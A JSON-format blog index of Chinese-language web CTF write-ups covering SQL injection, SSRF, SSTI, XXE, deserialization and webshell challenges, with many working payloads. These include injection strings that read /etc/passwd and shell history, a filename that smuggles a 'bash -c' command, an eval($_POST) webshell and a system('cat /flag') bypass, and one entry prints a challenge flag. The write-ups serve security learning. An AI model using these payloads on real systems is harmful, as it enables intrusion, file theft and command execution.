/proc//fd/","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"弹shell","slug":"弹shell","permalink":"/tags/弹shell/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[RCTF2015]EasySQL","slug":"RCTF2015-EasySQL","date":"2020-08-14T12:58:25.000Z","updated":"2020-08-14T14:10:45.564Z","comments":true,"path":"2020/08/14/RCTF2015-EasySQL/","link":"","permalink":"/2020/08/14/RCTF2015-EasySQL/","excerpt":"","text":"这次真长记性了，看到修改密码的我tm直接二次注入。注册用户名为1”的账号，修改密码时报错： 猜测后台sql语句: update users set password=’xxxx’ where username=”xxxx” and pwd=’c4ca4238a0b923820dcc509a6f75849b’因为存在报错回显，那么就可以直接用报错注入 test”^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1)# test”^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=’flag’))),1)# test”^updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag))),1)# 但是是个假flag，真flag在user表可以用regexp正则来匹配regexp(‘^r’)是MySql的正则，^r匹配开头是r的字段，也就是column_name=real_flag_1s_her test”^updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=’users’)&amp;&amp;(column_name)regexp(‘^r’))),1)# 正序逆序输出完整flag： test”^updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(‘^f’))),1)# test”^updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(‘^f’)))),1)#","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[GKCTF2020]EZ三剑客-EzWeb","slug":"GKCTF2020-EZ三剑客-EzWeb","date":"2020-08-13T13:10:13.000Z","updated":"2020-08-13T14:58:52.241Z","comments":true,"path":"2020/08/13/GKCTF2020-EZ三剑客-EzWeb/","link":"","permalink":"/2020/08/13/GKCTF2020-EZ三剑客-EzWeb/","excerpt":"","text":"根据源码中的提示访问?secret看到了一堆ifconfig的结果： 猜测是ssrf(Server-Side Request Forgery:服务器端请求伪造)，之前遇到过一次之后就再也没碰到过。试一下file协议读文件，但是被过滤了。这里用file:空格//绕过即可。 过滤了dict协议： 但是还可以用http协议进行内网主机存活探测。跑出来后提示端口不对，这里我接下来只跑了几百。。。一是因为bp是demo比较垃圾只能一线程跑太多不知道要到啥时候，二是因为对端口这方面了解不是很深没想到会到后面几千。看wp得知跑出结果应为6379。百度可知6379是redis的端口详情：https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/运行脚本得到ssrf的payload 由于编码问题，最好在框内提交。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[CISCN2019 华北赛区 Day1 Web5]CyberPunk","slug":"CISCN2019-华北赛区-Day1-Web5-CyberPunk","date":"2020-08-12T14:08:02.000Z","updated":"2020-08-12T15:06:42.136Z","comments":true,"path":"2020/08/12/CISCN2019-华北赛区-Day1-Web5-CyberPunk/","link":"","permalink":"/2020/08/12/CISCN2019-华北赛区-Day1-Web5-CyberPunk/","excerpt":"","text":"查看源码在最后发现了提示： 尝试用伪协议读取源码： 用同样的方式读取其他各个页面的源码： 以change.php为例： 可以看到对SQL注入做了比较严的过滤，但是，这过滤并没有针对address，address却只是进行了简单的转义。之前留言板那道题已经遇到过一次了，看到这个addslashes果断想到二次注入。利用updatexml：先读前30位：1’ where user_id=updatexml(1,concat(0x7e,(select substr(load_file(‘/flag.txt’),1,30)),0x7e),1)#再读最后几位：1’ where user_id=updatexml(1,concat(0x7e,(select substr(load_file(‘/flag.txt’),30,60)),0x7e),1)#因为updatexml这个函数最多显示32位，所以要分两次读。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[HITCON 2017]SSRFme","slug":"HITCON-2017-SSRFme","date":"2020-08-11T16:24:13.000Z","updated":"2020-08-11T17:04:18.753Z","comments":true,"path":"2020/08/12/HITCON-2017-SSRFme/","link":"","permalink":"/2020/08/12/HITCON-2017-SSRFme/","excerpt":"","text":"explode(separator,string)函数把以separator为分隔字符串将字符串打散为数组。 “REMOTE_ADDR”为正在浏览当前页面用户的 IP 地址。 escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数 pathinfo() 函数以数组的形式返回文件路径的信息。包括以下的数组元素： [dirname] //路径名 [basename] //文件名 [extension] //扩展名 basename() 函数返回路径中的文件名部分。 根据源码可以发现php会对传过去的参数用escapeshellarg函数过滤。先创建一个目录sandbox/md5(orange+ip)，然后执行GIT $_GET[‘url’]，然后会创建文件夹，并将执行GIT $_GET[‘url’]后的结果放在该文件夹下面filename传过去的文件中。 一、GET ./可以查看当前路径，GET …/可以查看上一级路径?url=../../../../../../&amp;filename=a或者?url=/&amp;filename=aaa然后访问可以看到flag和readflag猜想执行readflag flag可以得到flag，接下来就是如何构造并执行了。 二、利用perl的open命令有可能会导致命令执行perl在open当中可以执行命令，如: open(FD, “ls|”)或open(FD, “|ls”)都可以执行ls命令，而GET是在perl下执行的，当GET使用file协议的时候就会调用到perl的open函数，这就是我们要利用的点，利用bash -c “cmd string”来执行命令执行readflag。（不用bash -c可以直接/readflag读取flag）1、首先得满足前面的文件存在, 才会继续到open语句, 所以在执行命令前得保证有相应的同名文件:2、?url=&amp;filename=bash -c /readflag| 先新建一个名为“bash -c /readflag|”的文件，用于之后的命令执行3、?url=file:bash -c /readflag|&amp;filename=aaa 再利用GET执行bash -c /readflag保存到111文件4、访问sandbox/md5/aaa（得到flag）","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"GET命令执行漏洞","slug":"GET命令执行漏洞","permalink":"/tags/GET命令执行漏洞/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[SUCTF 2019]EasyWeb","slug":"SUCTF-2019-EasyWeb","date":"2020-08-07T15:28:32.000Z","updated":"2020-08-10T16:30:13.090Z","comments":true,"path":"2020/08/07/SUCTF-2019-EasyWeb/","link":"","permalink":"/2020/08/07/SUCTF-2019-EasyWeb/","excerpt":"","text":"这题实在太难了，本来想记录一下的，无奈实在是讲不清楚。知识点：1、构造不包含数字和字母的webshell2、文件上传绕过3、绕过open_basedir/disable_function 勉强看懂。 —————————————————— 突然发现了个大佬给了个特别简单的方法？突然感觉能做了。 异或绕过下面的那部分，然后直接ctrl+f在phpinfo找到flag。。。算是非预期了吧。 这两天在搭招新平台，基本没什么问题了，就是还不会出题。。。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[MRCTF2020]Ezpop","slug":"MRCTF2020-Ezpop","date":"2020-08-05T14:48:39.000Z","updated":"2020-08-05T15:42:22.174Z","comments":true,"path":"2020/08/05/MRCTF2020-Ezpop/","link":"","permalink":"/2020/08/05/MRCTF2020-Ezpop/","excerpt":"","text":"反序列化。说起反序列化，突然想起来之前的很多知识点都有点忘了，比如字符逃逸那块，明天回去复习一下。源码： Modifer类，有include，可以通过伪协议读取flag.php文件 __invoke方法，调用函数的方式调用一个对象时的回应方法 看到有__toString方法，类被当成字符串时的回应方法 __wakeup方法，unserialize反序列化时优先调用 __get()方法，访问不存在的属性或是受限的属性时调用 pop链构造","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[CISCN2019 华东南赛区]Web11","slug":"CISCN2019-华东南赛区-Web11","date":"2020-08-05T14:21:24.000Z","updated":"2020-08-05T14:40:09.943Z","comments":true,"path":"2020/08/05/CISCN2019-华东南赛区-Web11/","link":"","permalink":"/2020/08/05/CISCN2019-华东南赛区-Web11/","excerpt":"","text":"明天科目二。今天练了一天早点休息了。。。看这题目名字和这界面一开始以为很难是新知识点，直接百度了。。。仔细看了才知道原来就是ssti。（主要是smarty模板之前没见过没反应过来）知道了ssti就好办了，右上角显示了我们的ip，下面又有XFF。猜测是在XFF处发生ssti。smarty常用payload：","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"ssti smarty模板","slug":"ssti-smarty模板","permalink":"/tags/ssti-smarty模板/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[FBCTF2019]RCEService","slug":"FBCTF2019-RCEService","date":"2020-08-04T15:00:09.000Z","updated":"2020-08-04T15:18:40.854Z","comments":true,"path":"2020/08/04/FBCTF2019-RCEService/","link":"","permalink":"/2020/08/04/FBCTF2019-RCEService/","excerpt":"","text":"好像是当时比赛给了源码，但buu没有给： 过滤极为恐怖，长到直接不想看了。 新知识：preg_match()函数，只匹配一行，用个换行符搞定： flag：","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[V&N2020 公开赛]HappyCTFd","slug":"V-N2020-公开赛-HappyCTFd","date":"2020-08-04T13:54:12.000Z","updated":"2020-08-04T14:39:25.574Z","comments":true,"path":"2020/08/04/V-N2020-公开赛-HappyCTFd/","link":"","permalink":"/2020/08/04/V-N2020-公开赛-HappyCTFd/","excerpt":"","text":"要梯子才能打开。CTFd平台，给我一种要发现0day的幻觉QWQ。。。源码没有任何提示，于是尝试注册一个账号。没有题目，但是在用户界面发现了admin账号，应该是突破口了。网上查了一下应该是之前CTFd修复的账号接管漏洞。https://www.colabug.com/2020/0204/6940556/amp/ 1、注册首先申请一个内网的邮箱，因为靶机没法访问外网，在https://buuoj.cn/resources中找到相应链接。然后注册账户，空格绕过：（空格）admin 2.忘记密码，拿到admin的密码注册好以后退出登录，用admin登录（不加空格），点击忘记密码并将邮件发送到刚刚注册的内网邮箱，重置密码。 3、flag用admin账号登录，在hidden的misc题目附件中找到flag 这道题其实没学到啥，只是觉得好玩。。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"SSTI深入学习","slug":"SSTI深入学习","date":"2020-08-03T14:11:18.000Z","updated":"2020-08-03T16:06:05.276Z","comments":true,"path":"2020/08/03/SSTI深入学习/","link":"","permalink":"/2020/08/03/SSTI深入学习/","excerpt":"","text":"hexo毛病太多了，老是报错，直接用图片了。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[GYCTF2020]FlaskApp","slug":"GYCTF2020-FlaskApp","date":"2020-08-03T12:45:17.000Z","updated":"2020-08-03T16:01:06.940Z","comments":true,"path":"2020/08/03/GYCTF2020-FlaskApp/","link":"","permalink":"/2020/08/03/GYCTF2020-FlaskApp/","excerpt":"","text":"一个奇慢无比的网站。。。 base64decode在不会解析的时候就会报错。由报错可以读到部分代码。 关键代码如上图。get传参text，如果绕过waf则可以执行。尝试ssti注入在加密界面加密12得e3s2KzZ9fQ==解密得12于是构造语句， 进行文件读取 ssti命令总结：https://blog.csdn.net/weixin_43536759/article/details/105066445 读源码: import和os被过滤，但是可以用字符串拼接进行绕过： 发现了this_is_the_flag.txt 读取使用切片省去了拼接flag的步骤： 总结：ssti注入知识积累不够，待会儿就去总结一下这方面的知识。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[CISCN2019 总决赛 Day2 Web1]Easyweb","slug":"CISCN2019-总决赛-Day2-Web1-Easyweb","date":"2020-07-30T15:09:56.000Z","updated":"2020-07-30T16:24:42.580Z","comments":true,"path":"2020/07/30/CISCN2019-总决赛-Day2-Web1-Easyweb/","link":"","permalink":"/2020/07/30/CISCN2019-总决赛-Day2-Web1-Easyweb/","excerpt":"","text":"一个登录界面，没找到任何线索。dir扫到robots.txt，随着提示在image.php.bak处发现源码 和昨天那个二次注入有点像，有了昨天的基础，大致有了思路： addslashes()函数，这个函数会把特殊的字符转义。比如:单引号会被转义成\\’,斜杠会转义为\\\\.第十行的str_replace会把”\\\\0”,”%00”,”\\\\‘“,”‘“中的任意一个替换成空。我们可根据这个绕过当传入id=\\\\0时，就会在 查询语句处改变sql语句。即:select * from images where id=’ \\’ or path=’+{$path}’所以我们可以在path处注入我们的新语句. 参考的脚本 爆破得到了用户名和密码，登陆进去是一个上传界面： 抓包的时候有提示说用户名写进了log.php，既然是写入PHP，我们就想到写入一个PHP木马。用&lt;?= ?&gt;代替&lt;?php ?&gt;即可。 但这里有个疑惑，为啥直接写在文件名可以而写在文件内不行。。。难道只是这个文件名，会被写入日志文件中去？ flag蚁剑连接后在根目录。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[网鼎杯 2018]Comment","slug":"网鼎杯-2018-Comment","date":"2020-07-29T14:35:01.000Z","updated":"2020-07-29T16:46:46.947Z","comments":true,"path":"2020/07/29/网鼎杯-2018-Comment/","link":"","permalink":"/2020/07/29/网鼎杯-2018-Comment/","excerpt":"","text":"一个留言板，留言要登陆，提示了zhangwei、zhangwei***，burp爆破得密码zhangwei666。直接dir扫，git源码泄露： GItHack启动（之前GitHack报错是因为忘记把python3切换成python2了，属实憨憨）： 到这里卡住了，因为这个实在看不出来啥，看了wp才知道这是一段残缺的代码，需要进行恢复，又涨知识了QAQ。 指令：git log –reflog 接下来：git reset –hard xxxxx但这里环境好像出了点问题，不知道什么原因，一直没有成功恢复，估计不是我的问题了，应该是题目的问题。假装恢复了源码： 可以发现当do=write的时候，传入的信息都会进行转义，但是数据库会自动清除反斜杠， 当do=comment的时候，可以发现直接从category这个字段进行查询，这就导致了二次注入所以说那个转义函数根本起不到防护的作用 二次注入原理：https://www.jianshu.com/p/3fe7904683ac二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。 可以发现content这个变量最后会回显在我们的留言页面中，那么就通过他来输出我们的sql语句然后闭合sql语句 由于内容太多了，采取/**/的批量注释方法, 接着’,content=(select(load_file(“/etc/passwd”))),/* 注意看到/home/www下以bash身份运行‘,content=(select(load_file(“/home/www/.bash_history”))),/* 看见他删除了 .DS_Store 文件，由于目标环境是docker，所以 .DS_Store 文件应该在 /tmp/html 中。‘,content=(select(load_file(“/tmp/html/.DS_Store”))),/* 未显示完全,用hex编码显示‘,content=(select hex(load_file(“/tmp/html/.DS_Store”))),/* 解码得 payload：213’,content=(select hex(load_file(‘/var/www/html/flag_8946e1ff1ee3e40f.php’))),/* 解码得flag。 总结：这道题目还是挺迷的。。。第一个是直接user()而不是database()。后面二次注入虽然懂了原理但是还是不知道为什么会想到这样做。不知道自己什么时候能完全独立解出这种题。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"Git恢复+二次注入","slug":"Git恢复-二次注入","permalink":"/tags/Git恢复-二次注入/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[极客大挑战 2019]RCE ME","slug":"极客大挑战-2019-RCE-ME","date":"2020-07-28T13:51:40.000Z","updated":"2020-07-28T15:12:25.345Z","comments":true,"path":"2020/07/28/极客大挑战-2019-RCE-ME/","link":"","permalink":"/2020/07/28/极客大挑战-2019-RCE-ME/","excerpt":"","text":"构造取反读取phpinfo &lt;?php$s = ‘phpinfo’;echo urlencode(~$s);?&gt; payload：?code=(~%8F%97%8F%96%91%99%90)(); 构造取反连接蚁剑 &lt;?phpa=′assert′;echourlencode( a).”\\n”;b=′(eval(_POST[cmd]))’;echo urlencode(~$b).”\\n”;?&gt; 看到根目录下存在flag和readflag文件。应该是通过执行readflag来读取flag，但是这里的shell命令基本上都被禁了。 我们可以通过蚁剑的绕过disable_functions来执行。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[GWCTF 2019]枯燥的抽奖","slug":"GWCTF-2019-枯燥的抽奖","date":"2020-07-27T13:34:02.000Z","updated":"2020-07-27T14:49:27.169Z","comments":true,"path":"2020/07/27/GWCTF-2019-枯燥的抽奖/","link":"","permalink":"/2020/07/27/GWCTF-2019-枯燥的抽奖/","excerpt":"","text":"查看源码看到check.php mt_srand()函数 先用脚本将伪随机数转换成php_mt_seed可以识别的数据 爆破出伪随机数和php版本 再还原：","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"php mt_srand() 随机种子","slug":"php-mt-srand-随机种子","permalink":"/tags/php-mt-srand-随机种子/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[NCTF2019]Fake XML cookbook","slug":"NCTF2019-Fake-XML-cookbook","date":"2020-07-25T15:05:21.000Z","updated":"2020-07-26T14:25:02.443Z","comments":true,"path":"2020/07/25/NCTF2019-Fake-XML-cookbook/","link":"","permalink":"/2020/07/25/NCTF2019-Fake-XML-cookbook/","excerpt":"","text":"题目提示XML，可知为XXE攻击。 先来学习下xml实体注入攻击： https://www.freebuf.com/vuls/175451.html 可以看到抓包后下面就是xml格式，接下来增加我们自己的恶意实体，读取/etc/passwd文件 读取flag：","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"xxe","slug":"xxe","permalink":"/tags/xxe/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[GKCTF2020]老八小超市儿","slug":"GKCTF2020-老八小超市儿","date":"2020-07-24T05:47:03.000Z","updated":"2020-07-24T07:30:08.806Z","comments":true,"path":"2020/07/24/GKCTF2020-老八小超市儿/","link":"","permalink":"/2020/07/24/GKCTF2020-老八小超市儿/","excerpt":"","text":"网页是个购物网站模板，后台是admin.php查询得知ShopXO默认密码为shopxo成功进入后台。接下来就在应用中心里的应用商店找到主题，然后下载默认主题。写一个一句话进去，放在static里面，根据首页头像连接可以推测出路径，尝试访问成功后蚁剑连上去：找到了个假flag： 尝试打开root目录但是权限不够。这时看到了一个红色的文件。 找到并修改执行的文件，等待60秒后即可再flag.hint里看到flag。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[CISCN2019 华北赛区 Day1 Web1]Dropbox","slug":"CISCN2019-华北赛区-Day1-Web1-Dropbox","date":"2020-07-23T13:27:58.000Z","updated":"2020-07-23T17:03:24.585Z","comments":true,"path":"2020/07/23/CISCN2019-华北赛区-Day1-Web1-Dropbox/","link":"","permalink":"/2020/07/23/CISCN2019-华北赛区-Day1-Web1-Dropbox/","excerpt":"","text":"一道题一晚上，心 态 崩 了进去又是个登录框，遇事不决先dir扫一遍，可惜没什么发现： 然后注册了一个账号并登陆了进去，看到有个上传文件，传张图片试试，可以下载： 抓包试试： 可以看到filename，猜测可以利用这个点来下载任意文件。 成功查到源码 然后用相同办法下载所有的源码，index.php，upload.php, register.php, login.php, download.php, delete.php，再加上这些php文件中include的class.php。 然后，然后就不会了。。。 后面直接复制大佬的wp了： File类中的close方法会获取文件内容，如果能触发该方法，就有可能获取flag。 User类中存在close方法，并且该方法在对象销毁时执行。 同时FileList类中存在call魔术方法，并且类没有close方法。如果一个Filelist对象调用了close()方法，根据call方法的代码可以知道，文件的close方法会被执行，就可能拿到flag。 根据以上三条线索，梳理一下可以得出结论: 如果能创建一个user的对象，其db变量是一个FileList对象，对象中的文件名为flag的位置。这样的话，当user对象销毁时，db变量的close方法被执行；而db变量没有close方法，这样就会触发call魔术方法，进而变成了执行File对象的close方法。通过分析FileList类的析构方法可以知道，close方法执行后存在results变量里的结果会加入到table变量中被打印出来，也就是flag会被打印出来。 想实现上述想法，可以借助phar的伪协议。 生成phar文件后在删除的时候进行触发即可得到flag。 关于phar伪协议的用法，今天就不细细研究了，太晚了。后面几天整理知识点的时候再看看。 exp: 记得在php.ini配置文件里面修改phar.readonly为Off。（并且把前面分号去掉QAQ）将生成的文件上传bp抓包改类型为image/gif之后删除抓包修改为filename=phar://test.gifflag在response里 总结：我只能说，tql","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[CISCN2019 华北赛区 Day1 Web2]ikun","slug":"CISCN2019-华北赛区-Day1-Web2-ikun","date":"2020-07-22T13:18:34.000Z","updated":"2020-07-22T15:20:59.764Z","comments":true,"path":"2020/07/22/CISCN2019-华北赛区-Day1-Web2-ikun/","link":"","permalink":"/2020/07/22/CISCN2019-华北赛区-Day1-Web2-ikun/","excerpt":"","text":"很有趣的一道题目。。。注释里说留了些提示，大致翻了下也没找到有用的信息。 注册了一个账号，自己买了几个b站号后突然注意到一个小细节，说一定要买到lv6。但是翻了四页没有找到六级账号，有意思，突破口应该就在这里了。手动应该是不行的了，于是写脚本来检索六级账号： 查看180页，找到了6级账号和flag提示，但是买不起： 抓包修改下折扣试试看 看到了后台的地址，提示只允许admin访问。 这时注意到有jwt签名。（了解jwt：https://www.cnblogs.com/cjsblog/p/9277677.html） 伪造jwt 将后面解码不出来的通过c-jwt-crack爆破一下密钥 然后伪造我们的jwt（https://jwt.io/） 看到了下一步的提示（居然还没结束。。。） 查看www.zip中的内容（下面不会了，看的wp），注意到Admin.py文件。 这里的become先进行一次url解码，再进行pickle反序列化构造一下pickle反序列化python魔法方法指南：https://blog.csdn.net/bluehawksky/article/details/79027055 得到flag。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[MRCTF2020]你传你马呢","slug":"MRCTF2020-你传你马呢","date":"2020-07-22T12:49:24.000Z","updated":"2020-07-22T13:07:22.319Z","comments":true,"path":"2020/07/22/MRCTF2020-你传你马呢/","link":"","permalink":"/2020/07/22/MRCTF2020-你传你马呢/","excerpt":"","text":"可以上传.htaccess文件 图片马 蚁剑连接即可","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[WesternCTF2018]shrine","slug":"WesternCTF2018-shrine","date":"2020-07-21T15:06:20.000Z","updated":"2020-07-21T15:21:42.969Z","comments":true,"path":"2020/07/21/WesternCTF2018-shrine/","link":"","permalink":"/2020/07/21/WesternCTF2018-shrine/","excerpt":"","text":"整理源码得： 看到了jinja，下意识想到了ssti。在shirine路径下测试ssti： 分析源码，注册了一个名为FLAG的config，猜测这就是flag，如果没有过滤可以直接即可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号。当config,self,()都被过滤的时候，为了获取讯息，我们需要读取一些例如current_app这样的全局变量。这里有两个函数包含了current_app全局变量，url_for和get_flashed_messages。注入{url_for.globals}看到current_app current_app是当前使用的app，继续注入当前app的config{url_for.globals[‘current_app’].config}","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"ssti","slug":"ssti","permalink":"/tags/ssti/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[CISCN 2019 初赛]Love Math","slug":"CISCN-2019-初赛-Love-Math","date":"2020-07-21T13:32:27.000Z","updated":"2020-07-21T15:05:49.187Z","comments":true,"path":"2020/07/21/CISCN-2019-初赛-Love-Math/","link":"","permalink":"/2020/07/21/CISCN-2019-初赛-Love-Math/","excerpt":"","text":"1、长度要小于802、不包含黑名单中的字符3、只含白名单内的字符串/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/ 首先来提一个概念：php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);$a=’system’;$a(‘ls’); 可以尝试构造GET[]然后在传入想用的exp，但是这里把中括号下划线禁用了，那么就得需要编码绕过了。通过白名单我们看到了一些可能帮助我们编码绕过的函数 base_convert ，dechex，第一个可以进行进制之间的转换，比如 base_convert(“1001”2,10)是将二进制的1001转换为10进制，第二个函数是将10进制转成16进制。payload：?c=$_GETa&amp;a=system&amp;b=cat falg中括号被禁用我们可以用花括号代替{}，要构造的字符串为 _GET,php中有将16进制转成字符串的函数hex2bin，那么hex2bin又怎么生成呢，这时就需要我们的base_convert函数了，36进制也就是base36中有字母数字正好可以满足。所以 base_convert(37907361743,10,36)=hex2bin。因为我们是要得到_GET所以就得用到另外一个函数dechex将_GET的10进制转为16进制再通过hex2bin转换为字符串所以_GET=base_convert(37907361743,10,36)(dechex(1598506324));既然已经可以构造出$_GET[]了，那么直接将上面的payload修改下即可 c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi=system&amp;abs=cat /flag","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[SWPU2019]Web1","slug":"SWPU2019-Web1","date":"2020-07-20T13:18:07.000Z","updated":"2020-07-20T15:48:22.356Z","comments":true,"path":"2020/07/20/SWPU2019-Web1/","link":"","permalink":"/2020/07/20/SWPU2019-Web1/","excerpt":"","text":"广告版处存在注入， 先fuzz测试一波： 过滤的东西不多。接下来先爆列数order被过滤，还可以用group by1’//group//by/**/22,’1 一共有二十二列。。。or被过滤，information_schema不能使用，这里要用到无列名注入。-1’//union//select//1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22回显位是2，3.查数据库-1’union//select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22发现是马里奥数据库百度搜到了这个可以利用的： 查表-1’union//select//1,(select//group_concat(table_name)//from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22 无列名注入 设第二列别名为b-1’//union//select//1,(select//group_concat(b)//from//(select//1,2//as//b,3//union//select//*//from//users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22 设第三列别名为b-1’//union//select//1,(select//group_concat(b)//from//(select//1,2,3//as//b//union//select//*//from//users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"无列名注入","slug":"无列名注入","permalink":"/tags/无列名注入/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[BJDCTF2020]The mystery of ip","slug":"BJDCTF2020-The-mystery-of-ip","date":"2020-07-19T15:21:06.000Z","updated":"2020-07-19T15:25:10.805Z","comments":true,"path":"2020/07/19/BJDCTF2020-The-mystery-of-ip/","link":"","permalink":"/2020/07/19/BJDCTF2020-The-mystery-of-ip/","excerpt":"","text":"在hint.php找到了如下注释： flag.php显示你的ip尝试抓包修改X-Forwarded-For，果然随着我们的修改而改变，试一下是不是ssti： 存在ssti。 现在发现有时候不是题目不会做，而是没想到是这个方法，看来还是太菜了。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[BJDCTF2020]Mark loves cat","slug":"BJDCTF2020-Mark-loves-cat","date":"2020-07-19T13:38:40.000Z","updated":"2020-07-19T14:53:06.050Z","comments":true,"path":"2020/07/19/BJDCTF2020-Mark-loves-cat/","link":"","permalink":"/2020/07/19/BJDCTF2020-Mark-loves-cat/","excerpt":"","text":"今天第一次去练车，在驾校呆了一天，今天就少做一点题了。手动找了一圈没找到线索。（本来以为最下面的提交界面是突破口）于是dir启动： githack启动：虚拟机又炸了，估计下次得重装了，这里就直接百度了： 首先post：$flag=flag这样根据源码，$$flag=flag然后get：yds=flag这样就变成了：$yds=$flag根据if(!isset($_GET[‘flag’]) &amp;&amp; !isset($_POST[‘flag’])){exit($yds);}就会执行exit($flag),即可输出flag。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Unicorn shop&我有一个数据库","slug":"Unicorn-shop-我有一个数据库","date":"2020-07-18T14:26:37.000Z","updated":"2020-07-18T14:29:33.838Z","comments":true,"path":"2020/07/18/Unicorn-shop-我有一个数据库/","link":"","permalink":"/2020/07/18/Unicorn-shop-我有一个数据库/","excerpt":"","text":"两道比较简单的题目一、[ASIS 2019]Unicorn shop 一个购买独角兽的商店，购买前三个都会提示商品错误，，估计是要购买第四个，但是买第四个会提示只能输入一位，应该是要找一个一位的大于1337的字符。考点unicode，搜unicode大于1337的字符。id=4&amp;price=%E2%86%82 flag{4fc1bf7c-2b3c-4b3f-a418-bcab67ea145c} 二、[GWCTF 2019]我有一个数据库 dir扫到了phpmyadmin，直接访问，成功。但是进去以后不知道咋办了。。。 